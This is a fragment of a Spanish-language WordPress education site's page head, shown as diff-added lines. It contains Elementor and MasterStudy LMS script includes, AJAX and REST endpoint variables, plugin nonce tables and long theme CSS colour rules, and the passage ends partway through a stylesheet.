+<script src="https://edu.wilanye.com/wp-content/plugins/elementor/assets/lib/font-awesome/js/v4-shims.min.js?ver=3.30.0" id="font-awesome-4-shim-js"></script>
+<link rel="https://api.w.org/" href="https://edu.wilanye.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://edu.wilanye.com/wp-json/wp/v2/pages/972" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://edu.wilanye.com/xmlrpc.php?rsd" />
+<meta name="generator" content="WordPress 6.8.2" />
+<link rel="canonical" href="https://edu.wilanye.com/" />
+<link rel='shortlink' href='https://edu.wilanye.com/' />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://edu.wilanye.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fedu.wilanye.com%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://edu.wilanye.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fedu.wilanye.com%2F&#038;format=xml" />
+		<script>
+			var stm_lms_pro_nonces = {"stm_lms_pro_install_base":"41fc37aca8","stm_lms_pro_search_courses":"04c543fdd1","stm_lms_pro_udemy_import_courses":"2b34367b86","stm_lms_pro_udemy_publish_course":"1be9d879c7","stm_lms_pro_udemy_import_curriculum":"eebbb9794b","stm_lms_pro_save_addons":"91a4a0626b","stm_lms_create_announcement":"827a7cbb73","stm_lms_get_course_info":"b4ee23efc3","stm_lms_get_course_students":"da17f4b3e9","stm_lms_change_post_status":"2eeb7c580c","stm_lms_media_library_get_files":"990a472590","stm_lms_pro_upload_image":"121c2654f5","stm_lms_media_library_get_file_by_id":"35caf8cae1","stm_lms_media_library_delete_file":"75fb610748","stm_lms_media_library_search_file":"fb320c30ee"};
+		</script>
+			<script type="text/javascript">
+		var stm_lms_ajaxurl = 'https://edu.wilanye.com/wp-admin/admin-ajax.php';
+		var stm_lms_resturl = 'https://edu.wilanye.com/wp-json/stm-lms/v1';
+		var ms_lms_resturl = 'https://edu.wilanye.com/wp-json/masterstudy-lms/v2';
+		var ms_lms_nonce = '0bf33f0f9b';
+		var stm_ajax_add_pear_hb = '0ba55de1e6';
+			</script>
+	<style>
+		.vue_is_disabled {
+			display: none;
+		}
+		#wp-admin-bar-lms-settings img {
+			max-width: 16px;
+			vertical-align: sub;
+		}
+	</style>
+		<script>
+		var stm_lms_nonces = {"stm_install_starter_theme":"9cc0555ce4","load_modal":"afbdfbd853","load_content":"8a65f62642","start_quiz":"d63fc865f8","user_answers":"4a970bf80c","get_order_info":"35a6b72bd7","user_orders":"78681a0779","stm_lms_get_instructor_courses":"36f7eb3769","stm_lms_add_comment":"4d079c449b","stm_lms_manage_students":"6358e56826","stm_lms_get_comments":"e03e2318f5","stm_lms_login":"14bdd5bf0d","stm_lms_register":"01d570e320","stm_lms_become_instructor":"879241c577","stm_lms_enterprise":"13c3131226","stm_lms_get_user_courses":"893642cfaf","stm_lms_get_user_quizzes":"cd45a4a175","stm_lms_wishlist":"677a1dec2f","stm_lms_save_user_info":"da6fcf4e71","stm_lms_lost_password":"18ac6b870a","stm_lms_change_avatar":"67f170b3e0","stm_lms_delete_avatar":"45ddc987ba","stm_lms_complete_lesson":"13a5706493","stm_lms_use_membership":"ebf22a2cc4","stm_lms_change_featured":"140b0621a5","stm_lms_delete_course_subscription":"4114340cb5","stm_lms_get_reviews":"bad1eab3d1","stm_lms_add_review":"9d1785453d","stm_lms_add_to_cart":"c13d1e6c30","stm_lms_delete_from_cart":"cefc8e2716","stm_lms_purchase":"eeed932db4","stm_lms_send_message":"012139075f","stm_lms_get_user_conversations":"917b2aa941","stm_lms_get_user_messages":"175dfd203e","stm_lms_clear_new_messages":"c2315ad5ed","wpcfto_save_settings":"5bbe2d2272","stm_lms_tables_update":"3cece1f15b","stm_lms_get_enterprise_groups":"29e6aee5dc","stm_lms_get_enterprise_group":"2ae70ec10e","stm_lms_add_enterprise_group":"7439f26007","stm_lms_delete_enterprise_group":"19056f911a","stm_lms_add_to_cart_enterprise":"40afea46b6","stm_lms_get_user_ent_courses":"ae9c84bb59","stm_lms_delete_user_ent_courses":"ba7b26c253","stm_lms_add_user_ent_courses":"4fbb29b351","stm_lms_change_ent_group_admin":"b7b4cc3139","stm_lms_delete_user_from_group":"d9e20ff203","stm_lms_import_groups":"e1166ec88e","stm_lms_edit_user_answer":"1a15262ded","stm_lms_get_user_points_history":"645a075818","stm_lms_buy_for_points":"b87d9809a6","stm_lms_get_point_users":"7099a9780e","stm_lms_get_user_points_history_admin":"e2b6c4e75e","stm_lms_change_points":"43211fde94","stm_lms_delete_points":"23e2c87334","stm_lms_get_user_bundles":"5d8c2035e8","stm_lms_change_bundle_status":"61a7722eaf","stm_lms_delete_bundle":"9c330ed6ce","stm_lms_check_certificate_code":"5cc0c01e27","stm_lms_get_google_classroom_courses":"3467067f6c","stm_lms_get_google_classroom_course":"0376a1754f","stm_lms_get_google_classroom_publish_course":"413abdbfe6","stm_lms_get_g_c_get_archive_page":"13cd0e1c0b","install_zoom_addon":"ef3ecb1715","stm_lms_get_course_cookie_redirect":"05cbcd34c9","stm_get_certificates":"4c4cf0082e","stm_get_certificate_fields":"588ad97852","stm_save_certificate":"1c80a27d8e","stm_upload_certificate_images":"77421c1d01","stm_generate_certificates_preview":"a4b45335df","stm_save_default_certificate":"c48112f7eb","stm_delete_default_certificate":"51d9897737","stm_save_certificate_category":"0f45146a0c","stm_delete_certificate_category":"4681ab08ed","stm_get_certificate_categories":"f6bf94b0ca","stm_get_certificate":"0ff0868592","stm_delete_certificate":"8c4042616e","stm_lms_get_users_submissions":"ed72cfdca0","stm_lms_update_user_status":"6e7450bee1","stm_lms_hide_become_instructor_notice":"74211fb90e","stm_lms_ban_user":"753b4156ee","stm_lms_save_forms":"6f390d78e5","stm_lms_get_forms":"2055568a14","stm_lms_upload_form_file":"bb599f421b","stm_lms_dashboard_get_course_students":"812a2dc39c","stm_lms_dashboard_delete_user_from_course":"b4f6193463","stm_lms_dashboard_add_user_to_course":"03abbf713c","stm_lms_dashboard_import_users_to_course":"d069e32069","stm_lms_dashboard_export_course_students_to_csv":"d95ff585dc","stm_lms_add_to_cart_guest":"e714c99c11","stm_lms_fast_login":"b5cc66b09c","stm_lms_fast_register":"18d8f49f23","stm_lms_change_lms_author":"552ddcca57","stm_lms_add_student_manually":"88852f5ec1","stm_lms_change_course_status":"2f2212115c","stm_lms_total_progress":"6779d2e860","stm_lms_add_h5p_result":"df2a0b0e7f","stm_lms_toggle_buying":"ef8973d4dc","stm_lms_logout":"f41f2df26f","stm_lms_restore_password":"add61068ec","stm_lms_hide_announcement":"34e2e436d6","stm_lms_get_curriculum_v2":"04143fdda5","stm_lms_dashboard_get_student_progress":"d2f31507b8","stm_lms_dashboard_set_student_item_progress":"1463f29a3f","stm_lms_dashboard_reset_student_progress":"b5b23cbb50","stm_lms_dashboard_get_courses_list":"e4c86c8d17","stm_lms_dashboard_get_student_assignments":"a709410700","stm_lms_dashboard_get_student_quizzes":"c059017429","stm_lms_dashboard_get_student_quiz":"837bb97455","stm_lms_wizard_save_settings":"37b2f0c5e2","stm_lms_wizard_save_business_type":"939c1bfe2f","stm_lms_get_enrolled_assingments":"ed324feb35","stm-lms-starter-theme-install":"5aafa420db","stm_lms_enrolled_quizzes":"dede0851b7"};
+	</script>
+		<style>
+		:root {
+							--accent-100: rgba(30,30,30,1);
+				--accent-70: rgba(30, 30, 30, 0.7);
+				--accent-50: rgba(30, 30, 30, 0.5);
+				--accent-30: rgba(30, 30, 30, 0.3);
+				--accent-10: rgba(30, 30, 30, 0.1);
+				--accent-5: rgba(30, 30, 30, 0.05);
+				--accent-0: rgba(30, 30, 30, 0);
+				--accent-hover: rgba(30, 30, 30, 0.85);
+							--warning-100: rgba(255,168,0,1);
+				--warning-70: rgba(255, 168, 0, 0.7);
+				--warning-50: rgba(255, 168, 0, 0.5);
+				--warning-30: rgba(255, 168, 0, 0.3);
+				--warning-10: rgba(255, 168, 0, 0.1);
+				--warning-5: rgba(255, 168, 0, 0.05);
+				--warning-0: rgba(255, 168, 0, 0);
+				--warning-hover: rgba(255, 168, 0, 0.85);
+							--danger-100: rgba(255,57,69,1);
+				--danger-70: rgba(255, 57, 69, 0.7);
+				--danger-50: rgba(255, 57, 69, 0.5);
+				--danger-30: rgba(255, 57, 69, 0.3);
+				--danger-10: rgba(255, 57, 69, 0.1);
+				--danger-5: rgba(255, 57, 69, 0.05);
+				--danger-0: rgba(255, 57, 69, 0);
+				--danger-hover: rgba(255, 57, 69, 0.85);
+							--success-100: rgba(97,204,47,1);
+				--success-70: rgba(97, 204, 47, 0.7);
+				--success-50: rgba(97, 204, 47, 0.5);
+				--success-30: rgba(97, 204, 47, 0.3);
+				--success-10: rgba(97, 204, 47, 0.1);
+				--success-5: rgba(97, 204, 47, 0.05);
+				--success-0: rgba(97, 204, 47, 0);
+				--success-hover: rgba(97, 204, 47, 0.85);
+					}
+	</style>
+	<link rel="alternate" hreflang="es-ES" href="https://edu.wilanye.com/"/>
+<link rel="alternate" hreflang="es" href="https://edu.wilanye.com/"/>
+	<script type="text/javascript">
+		var stm_wpcfto_ajaxurl = 'https://edu.wilanye.com/wp-admin/admin-ajax.php';
+	</script>
+
+	<style>
+		.vue_is_disabled {
+			display: none;
+		}
+	</style>
+		<script>
+		var stm_wpcfto_nonces = {"wpcfto_save_settings":"5bbe2d2272","get_image_url":"3a35070109","wpcfto_upload_file":"97c208898a","wpcfto_search_posts":"97929cdfbc","wpcfto_regenerate_fonts":"20ef1bd37e","wpcfto_create_term":"ed96641a79"};
+	</script>
+	<meta name="generator" content="Elementor 3.30.0; features: e_font_icon_svg, additional_custom_breakpoints, e_element_cache; settings: css_print_method-external, google_font-enabled, font_display-swap">
+			<style>
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload),
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload) * {
+					background-image: none !important;
+				}
+				@media screen and (max-height: 1024px) {
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+				@media screen and (max-height: 640px) {
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+			</style>
+			<style type="text/css" title="dynamic-css" class="options-output">.logo-unit .logo{font-family:Poppins;color:#3a3a3a;font-size:23px;}#header .header_default, #header .header_default .stm_header_links a, #header .header_default .header_main_menu_wrapper a, #header .header_default .header_top_bar a, #header .header_default .right_buttons a > i, #header .header_default .header_top_bar{color:#d6d6d6;}#header .header_default .stm_header_links a:hover, #header .header_default .header_main_menu_wrapper a:hover, #header .header_default .header_top_bar a:hover,
+                    .header_5 .header_main_menu_wrapper .header-menu > li.current-menu-item > a, .header_5 .header_main_menu_wrapper .header-menu > li:hover > a{color:#1e1e1e;}.header_top_bar, .header_top_bar a, .header_2_top_bar .header_2_top_bar__inner ul.header-menu li a{font-family:Poppins;font-weight:normal;font-style:normal;color:#aaaaaa;font-size:12px;}
+body.skin_custom_color .stm_archive_product_inner_grid_content .stm-courses li.product.course-col-list .product-image .onsale,
+body.skin_custom_color .related.products .stm-courses li.product.course-col-list .product-image .onsale,
+body.skin_custom_color .stm_archive_product_inner_grid_content .stm-courses li.product .product__inner .woocommerce-LoopProduct-link .onsale,
+body.skin_custom_color .related.products .stm-courses li.product .product__inner .woocommerce-LoopProduct-link .onsale,
+body.skin_custom_color .post_list_main_section_wrapper .post_list_meta_unit .sticky_post,
+body.skin_custom_color .overflowed_content .wpb_column .icon_box,
+.wc-block-checkout__actions_row .wc-block-components-checkout-place-order-button, 
+.wc-block-components-totals-coupon__form .wc-block-components-totals-coupon__button,
+.wc-block-cart__submit-button,
+body.skin_custom_color .stm_countdown_bg,
+body.skin_custom_color #searchform-mobile .search-wrapper .search-submit,
+body.skin_custom_color .header-menu-mobile .header-menu > li .arrow.active,
+body.skin_custom_color .header-menu-mobile .header-menu > li.opened > a,
+body.skin_custom_color mark,
+body.skin_custom_color .woocommerce .cart-totals_wrap .shipping-calculator-button:hover,
+body.skin_custom_color .detailed_rating .detail_rating_unit tr td.bar .full_bar .bar_filler,
+body.skin_custom_color .product_status.new,
+body.skin_custom_color .stm_woo_helpbar .woocommerce-product-search input[type="submit"],
+body.skin_custom_color .stm_archive_product_inner_unit .stm_archive_product_inner_unit_centered .stm_featured_product_price .price.price_free,
+body.skin_custom_color .sidebar-area .widget:after,
+body.skin_custom_color .sidebar-area .socials_widget_wrapper .widget_socials li .back a,
+body.skin_custom_color .socials_widget_wrapper .widget_socials li .back a,
+body.skin_custom_color .widget_categories ul li a:hover:after,
+body.skin_custom_color .event_date_info_table .event_btn .btn-default,
+body.skin_custom_color .course_table tr td.stm_badge .badge_unit.quiz,
+body.skin_custom_color .page-links span:hover,
+body.skin_custom_color .page-links span:after,
+body.skin_custom_color .page-links > span:after,
+body.skin_custom_color .page-links > span,
+body.skin_custom_color .stm_post_unit:after,
+body.skin_custom_color .blog_layout_grid .post_list_content_unit:after,
+body.skin_custom_color ul.page-numbers > li a.page-numbers:after,
+body.skin_custom_color ul.page-numbers > li span.page-numbers:after,
+body.skin_custom_color ul.page-numbers > li a.page-numbers:hover,
+body.skin_custom_color ul.page-numbers > li span.page-numbers:hover,
+body.skin_custom_color ul.page-numbers > li a.page-numbers.current:after,
+body.skin_custom_color ul.page-numbers > li span.page-numbers.current:after,
+body.skin_custom_color ul.page-numbers > li a.page-numbers.current,
+body.skin_custom_color ul.page-numbers > li span.page-numbers.current,
+body.skin_custom_color .triangled_colored_separator,
+body.skin_custom_color .magic_line,
+body.skin_custom_color .navbar-toggle .icon-bar,
+body.skin_custom_color .navbar-toggle:hover .icon-bar,
+body.skin_custom_color #searchform .search-submit,
+body.skin_custom_color .header_main_menu_wrapper .header-menu > li > ul.sub-menu:before,
+body.skin_custom_color .search-toggler:after,
+body.skin_custom_color .modal .popup_title,
+body.skin_custom_color .sticky_post,
+body.skin_custom_color .btn-carousel-control:after,
+.primary_bg_color,
+.mbc,
+.stm_lms_courses_carousel_wrapper .owl-dots .owl-dot.active,
+.stm_lms_courses_carousel__term.active,
+body.course_hub .header_default.header_2,
+.triangled_colored_separator:before,
+.triangled_colored_separator:after,
+body.skin_custom_color.udemy .btn-default,
+.single_instructor .stm_lms_courses .stm_lms_load_more_courses,
+.single_instructor .stm_lms_courses .stm_lms_load_more_courses:hover,
+.stm_lms_course_sticky_panel .stm_lms_course_sticky_panel__button .btn,
+.stm_lms_course_sticky_panel .stm_lms_course_sticky_panel__button .btn:hover,
+body.skin_custom_color.language_center .btn-default,
+.header-login-button.sign-up a,
+#header .header_6 .stm_lms_log_in,
+body.cooking .stm_lms_courses_carousel__buttons .stm_lms_courses_carousel__button:hover,
+body.cooking .stm_theme_wpb_video_wrapper .stm_video_preview:after,
+body.cooking .btn.btn-default,
+body.cooking .button,
+body.cooking .form-submit .submit,
+body.cooking .post-password-form input[type=submit],
+body.cooking .btn.btn-default:hover,
+body.cooking .button:hover,
+body.cooking .form-submit .submit:hover,
+body.cooking .post-password-form input[type=submit]:hover,
+body.cooking div.multiseparator:after,
+body.cooking .view_type_switcher a.view_grid.active_grid,
+body.cooking .view_type_switcher a.view_list.active_list,
+body.cooking .view_type_switcher a:hover,
+body.cooking.woocommerce .sidebar-area .widget .widget_title:after,
+body.cooking.woocommerce .sidebar-area .widget.widget_price_filter .price_slider_wrapper .price_slider .ui-slider-handle,
+body.cooking.woocommerce .sidebar-area .widget.widget_price_filter .price_slider_wrapper .price_slider .ui-slider-range,
+body.cooking .stm_lms_courses_list_view .stm_lms_courses__grid .stm_lms_courses__single--image>a:after,
+body.cooking .testimonials_main_wrapper.simple_carousel_wrapper .btn-carousel-control:hover,
+body.cooking .testimonials_main_wrapper.simple_carousel_wrapper .btn-carousel-control:focus,
+body.cooking .short_separator,
+body.cooking .widget_tag_cloud .tagcloud a:hover,
+body.cooking .blog_layout_grid .sticky .post_list_meta_unit,
+body.cooking .stm_lms_instructor_courses__single--featured .feature_it,
+
+.stm_archive_product_inner_grid_content .stm-courses li.product .product__inner .button:hover,
+
+body.tech .stm_lms_courses_carousel__buttons .stm_lms_courses_carousel__button:hover,
+body.tech .stm_theme_wpb_video_wrapper .stm_video_preview:after,
+body.tech .btn.btn-default,
+body.tech .button,
+body.tech .form-submit .submit,
+body.tech .post-password-form input[type=submit],
+body.tech .btn.btn-default:hover,
+body.tech .button:hover,
+body.tech .form-submit .submit:hover,
+body.tech .post-password-form input[type=submit]:hover,
+body.tech div.multiseparator:after,
+body.tech .view_type_switcher a.view_grid.active_grid,
+body.tech .view_type_switcher a.view_list.active_list,
+body.tech .view_type_switcher a:hover,
+body.tech.woocommerce .sidebar-area .widget .widget_title:after,
+body.tech.woocommerce .sidebar-area .widget.widget_price_filter .price_slider_wrapper .price_slider .ui-slider-handle,
+body.tech.woocommerce .sidebar-area .widget.widget_price_filter .price_slider_wrapper .price_slider .ui-slider-range,
+body.tech .stm_lms_courses_list_view .stm_lms_courses__grid .stm_lms_courses__single--image>a:after,
+body.tech .testimonials_main_wrapper.simple_carousel_wrapper .btn-carousel-control:hover,
+body.tech .testimonials_main_wrapper.simple_carousel_wrapper .btn-carousel-control:focus,
+body.tech .short_separator,
+body.tech .stm_lms_wishlist_button .lnr:after,
+body.tech .widget_tag_cloud .tagcloud a:hover,
+body.tech .blog_layout_grid .sticky .post_list_meta_unit,
+body.tech .stm_lms_instructor_courses__single--featured .feature_it,
+body.tech .select2-container--default .select2-results__option--highlighted[aria-selected],
+body.tech .select2-container--default .select2-results__option--highlighted[data-selected]
+{background-color:#393939;}.icon_box.stm_icon_box_hover_none{border-left-color:#393939;}
+						
+.wc-block-checkout__actions_row .wc-block-components-checkout-place-order-button, 
+.wc-block-components-totals-coupon__form .wc-block-components-totals-coupon__button,
+.wc-block-cart__submit-button,
+body.skin_custom_color ul.page-numbers > li a.page-numbers:hover,
+body.skin_custom_color ul.page-numbers > li a.page-numbers.current,
+body.skin_custom_color ul.page-numbers > li span.page-numbers.current,
+body.skin_custom_color .custom-border textarea:active,
+body.skin_custom_color .custom-border input[type=text]:active,
+body.skin_custom_color .custom-border input[type=email]:active,
+body.skin_custom_color .custom-border input[type=number]:active,
+body.skin_custom_color .custom-border input[type=password]:active,
+body.skin_custom_color .custom-border input[type=tel]:active,
+body.skin_custom_color .custom-border .form-control:active,
+body.skin_custom_color .custom-border textarea:focus,
+body.skin_custom_color .custom-border input[type=text]:focus,
+body.skin_custom_color .custom-border input[type=email]:focus,
+body.skin_custom_color .custom-border input[type=number]:focus,
+body.skin_custom_color .custom-border input[type=password]:focus,
+body.skin_custom_color .custom-border input[type=tel]:focus,
+body.skin_custom_color .custom-border .form-control:focus,
+body.skin_custom_color .icon-btn:hover .icon_in_btn,
+body.skin_custom_color .icon-btn:hover,
+body.skin_custom_color .average_rating_unit,
+body.skin_custom_color blockquote,
+body.skin_custom_color .tp-caption .icon-btn:hover .icon_in_btn,
+body.skin_custom_color .tp-caption .icon-btn:hover,
+body.skin_custom_color .stm_theme_wpb_video_wrapper .stm_video_preview:after,
+body.skin_custom_color .btn-carousel-control,
+body.skin_custom_color .post_list_main_section_wrapper .post_list_meta_unit .post_list_comment_num,
+body.skin_custom_color .post_list_main_section_wrapper .post_list_meta_unit,
+body.skin_custom_color .search-toggler:hover,
+body.skin_custom_color .search-toggler,
+.stm_lms_courses_carousel_wrapper .owl-dots .owl-dot.active,
+.triangled_colored_separator .triangle:before,
+body.cooking .stm_lms_courses_carousel__buttons .stm_lms_courses_carousel__button,
+body.cooking .btn.btn-default,
+body.cooking .button,
+body.cooking .form-submit .submit,
+body.cooking .post-password-form input[type=submit],
+body.cooking.woocommerce .sidebar-area .widget.widget_product_categories ul li a:after,
+body.cooking .select2-container--default .select2-selection--single .select2-selection__arrow b:after,
+body.cooking.woocommerce .sidebar-area .widget .widget_title:after,
+body.cooking .blog_layout_grid .plugin_style .post_list_inner_content_unit .post_list_meta_unit,
+body.cooking .blog_layout_grid .plugin_style .post_list_inner_content_unit .post_list_meta_unit .post_list_comment_num,
+body.cooking .widget_tag_cloud .tagcloud a:hover,
+
+body.tech .stm_lms_courses_carousel__buttons .stm_lms_courses_carousel__button,
+body.tech .btn.btn-default,
+body.tech .button,
+body.tech .form-submit .submit,
+body.tech .post-password-form input[type=submit],
+body.tech.woocommerce .sidebar-area .widget.widget_product_categories ul li a:after,
+body.tech .select2-container--default .select2-selection--single .select2-selection__arrow b:after,
+body.tech.woocommerce .sidebar-area .widget .widget_title:after,
+body.tech .blog_layout_grid .plugin_style .post_list_inner_content_unit .post_list_meta_unit,
+body.tech .blog_layout_grid .plugin_style .post_list_inner_content_unit .post_list_meta_unit .post_list_comment_num,
+body.tech .widget_tag_cloud .tagcloud a:hover,
+body.tech .stm_lms_points_history__head .left a,
+body.tech .simple_carousel_wrapper_style_6 .navs #carousel-custom-dots li.active:before
+{border-color:#393939;}
+body.skin_custom_color .icon_box .icon i,
+body.skin_custom_color .icon-btn:hover .icon_in_btn,
+body.skin_custom_color .icon-btn:hover .link-title,
+body.skin_custom_color .stats_counter .h1,
+body.skin_custom_color .event_date_info .event_date_info_unit .event_labels,
+body.skin_custom_color .event-col .event_archive_item .event_location i,
+body.skin_custom_color .event-col .event_archive_item .event_start i,
+body.skin_custom_color .gallery_terms_list li.active a,
+body.skin_custom_color .tp-caption .icon-btn:hover .icon_in_btn,
+body.skin_custom_color .teacher_single_product_page>a:hover .title,
+body.skin_custom_color .sidebar-area .widget ul li a:hover:after,
+body.skin_custom_color div.pp_woocommerce .pp_gallery ul li a:hover,
+body.skin_custom_color div.pp_woocommerce .pp_gallery ul li.selected a,
+body.skin_custom_color .single_product_after_title .meta-unit i,
+body.skin_custom_color .single_product_after_title .meta-unit .value a:hover,
+body.skin_custom_color .woocommerce-breadcrumb a:hover,
+body.skin_custom_color #footer_copyright .copyright_text a:hover,
+body.skin_custom_color .widget_stm_recent_posts .widget_media .cats_w a:hover,
+body.skin_custom_color .widget_pages ul.style_2 li a:hover,
+body.skin_custom_color .sidebar-area .widget_categories ul li a:hover,
+body.skin_custom_color .sidebar-area .widget ul li a:hover,
+body.skin_custom_color .widget_categories ul li a:hover,
+body.skin_custom_color .stm_product_list_widget li a:hover .title,
+body.skin_custom_color .widget_contacts ul li .text a:hover,
+body.skin_custom_color .sidebar-area .widget_pages ul.style_1 li a:focus .h6,
+body.skin_custom_color .sidebar-area .widget_nav_menu ul.style_1 li a:focus .h6,
+body.skin_custom_color .sidebar-area .widget_pages ul.style_1 li a:focus,
+body.skin_custom_color .sidebar-area .widget_nav_menu ul.style_1 li a:focus,
+body.skin_custom_color .sidebar-area .widget_pages ul.style_1 li a:active .h6,
+body.skin_custom_color .sidebar-area .widget_nav_menu ul.style_1 li a:active .h6,
+body.skin_custom_color .sidebar-area .widget_pages ul.style_1 li a:active,
+body.skin_custom_color .sidebar-area .widget_nav_menu ul.style_1 li a:active,
+body.skin_custom_color .sidebar-area .widget_pages ul.style_1 li a:hover .h6,
+body.skin_custom_color .sidebar-area .widget_nav_menu ul.style_1 li a:hover .h6,
+body.skin_custom_color .sidebar-area .widget_pages ul.style_1 li a:hover,
+body.skin_custom_color .sidebar-area .widget_nav_menu ul.style_1 li a:hover,
+body.skin_custom_color .widget_pages ul.style_1 li a:focus .h6,
+body.skin_custom_color .widget_nav_menu ul.style_1 li a:focus .h6,
+body.skin_custom_color .widget_pages ul.style_1 li a:focus,
+body.skin_custom_color .widget_nav_menu ul.style_1 li a:focus,
+body.skin_custom_color .widget_pages ul.style_1 li a:active .h6,
+body.skin_custom_color .widget_nav_menu ul.style_1 li a:active .h6,
+body.skin_custom_color .widget_pages ul.style_1 li a:active,
+body.skin_custom_color .widget_nav_menu ul.style_1 li a:active,
+body.skin_custom_color .widget_pages ul.style_1 li a:hover .h6,
+body.skin_custom_color .widget_stm_recent_posts a:hover .h6,
+body.skin_custom_color .widget_contacts_email a:hover,
+body.skin_custom_color .widget_nav_menu ul.style_1 li a:hover .h6,
+body.skin_custom_color .widget_pages ul.style_1 li a:hover,
+body.skin_custom_color .widget_nav_menu ul.style_1 li a:hover,
+body.skin_custom_color .see_more a:after,
+body.skin_custom_color .see_more a,
+body.skin_custom_color .transparent_header_off .header_main_menu_wrapper ul > li > ul.sub-menu > li a:hover,
+body.skin_custom_color .stm_breadcrumbs_unit .navxtBreads > span a:hover,
+body.skin_custom_color .btn-carousel-control,
+body.skin_custom_color .post_list_main_section_wrapper .post_list_meta_unit .post_list_comment_num,
+body.skin_custom_color .post_list_main_section_wrapper .post_list_meta_unit .date-m,
+body.skin_custom_color .post_list_main_section_wrapper .post_list_meta_unit .date-d,
+body.skin_custom_color .stats_counter h1,
+body.skin_custom_color .yellow,
+body.skin_custom_color ol li a:hover,
+body.skin_custom_color ul li a:hover,
+body.skin_custom_color .search-toggler,
+.primary_color,
+.mtc_h:hover,
+body.classic_lms .header_top_bar .header_top_bar_socs ul li a:hover,
+body.classic_lms .header_top_bar a:hover,
+#footer .widget_stm_lms_popular_courses ul li a:hover .meta .h5.title,
+body.classic_lms .stm_lms_wishlist_button a:hover i,
+.classic_lms .post_list_main_section_wrapper .post_list_item_title:hover,
+.stm_lms_courses__single.style_2 .stm_lms_courses__single--title h5:hover,
+body.cooking .stm_lms_courses_carousel__buttons .stm_lms_courses_carousel__button,
+body.cooking #footer .widget_contacts ul li .icon,
+body.cooking #footer .stm_product_list_widget.widget_woo_stm_style_2 li a:hover .meta .title,
+body.cooking .courses_filters__switcher i:not(.active),
+body.cooking .blog_layout_grid .plugin_style .post_list_inner_content_unit .post_list_meta_unit .date-d,
+body.cooking .blog_layout_grid .post_list_meta_unit .date-m,
+body.cooking .blog_layout_grid .plugin_style .post_list_inner_content_unit .post_list_meta_unit .post_list_comment_num,
+body.cooking .stm_post_info .stm_post_details .post_meta li i,
+body.cooking .comment-form .logged-in-as a,
+body.cooking .post_list_content_unit .post_list_item_title:hover,
+body.cooking .post_list_content_unit .post_list_item_title:focus,
+body.cooking .widget_search .search-form>label:after,
+body.cooking .blog_layout_grid .post_list_cats a,
+body.cooking .blog_layout_grid .post_list_item_tags a,
+body.cooking .blog_layout_grid .plugin_style .post_list_inner_content_unit .post_list_meta_unit .date-d,
+body.cooking .blog_layout_grid .plugin_style .post_list_inner_content_unit .post_list_meta_unit .date-m-plugin,
+body.cooking .blog_layout_grid .plugin_style .post_list_inner_content_unit .post_list_meta_unit .post_list_comment_num,
+body.cooking #stm_lms_faq .panel.panel-default .panel-heading .panel-title a:hover,
+body.cooking .stm_post_info .stm_post_details .comments_num .post_comments:hover,
+body.cooking .stm_lms_courses_list_view .stm_lms_courses__grid .stm_lms_courses__single--info_title a:hover h4,
+body.cooking .comments-area .commentmetadata i,
+body.cooking .stm_lms_gradebook__filter .by_views_sorter.by-views,
+body.cooking .stm_post_info .stm_post_details .comments_num .post_comments i,
+
+body.tech .stm_lms_courses_carousel__buttons .stm_lms_courses_carousel__button,
+body.tech #footer .widget_contacts ul li .icon,
+body.tech #footer .stm_product_list_widget.widget_woo_stm_style_2 li a:hover .meta .title,
+body.tech .courses_filters__switcher i:not(.active),
+body.tech .blog_layout_grid .plugin_style .post_list_inner_content_unit .post_list_meta_unit .date-d,
+body.tech .blog_layout_grid .post_list_meta_unit .date-m,
+body.tech .blog_layout_grid .plugin_style .post_list_inner_content_unit .post_list_meta_unit .post_list_comment_num,
+body.tech .stm_post_info .stm_post_details .post_meta li i,
+body.tech .comment-form .logged-in-as a,
+body.tech .post_list_content_unit .post_list_item_title:hover,
+body.tech .post_list_content_unit .post_list_item_title:focus,
+body.tech .widget_search .search-form>label:after,
+body.tech .blog_layout_grid .post_list_cats a,
+body.tech .blog_layout_grid .post_list_item_tags a,
+body.tech .footer_wrapper .widget_contacts ul li .text a,
+body.tech .blog_layout_grid .plugin_style .post_list_inner_content_unit .post_list_meta_unit .date-d,
+body.tech .blog_layout_grid .plugin_style .post_list_inner_content_unit .post_list_meta_unit .date-m-plugin,
+body.tech .blog_layout_grid .plugin_style .post_list_inner_content_unit .post_list_meta_unit .post_list_comment_num,
+body.tech #stm_lms_faq .panel.panel-default .panel-heading .panel-title a:hover,
+body.tech .stm_post_info .stm_post_details .comments_num .post_comments:hover,
+body.tech .stm_lms_courses_list_view .stm_lms_courses__grid .stm_lms_courses__single--info_title a:hover h4,
+body.tech .comments-area .commentmetadata i,
+body.tech .stm_lms_gradebook__filter .by_views_sorter.by-views,
+body.tech .stm_post_info .stm_post_details .comments_num .post_comments i,
+body.tech .stm_lms_courses_carousel__top .h4:hover,
+body.tech.skin_custom_color #footer a:hover,
+body.tech .socials_widget_wrapper__text a,
+.testimonials_main_title_6 i
+{color:#393939;}
+body.skin_custom_color .triangled_colored_separator .triangle,
+body.skin_custom_color .magic_line:after,
+body.cooking .stm_lms_gradebook__filter .by_views_sorter.by-views,
+body.tech .stm_lms_gradebook__filter .by_views_sorter.by-views
+{border-bottom-color:#393939;}body.rtl-demo .stm_testimonials_wrapper_style_2 .stm_lms_testimonials_single__content:after{border-left-color:#1E1E1E;}
+body.skin_custom_color .blog_layout_grid .post_list_meta_unit .sticky_post,
+body.skin_custom_color .blog_layout_list .post_list_meta_unit .sticky_post,
+.wc-block-checkout__actions_row .wc-block-components-checkout-place-order-button:hover, 
+.wc-block-components-totals-coupon__form .wc-block-components-totals-coupon__button:hover,
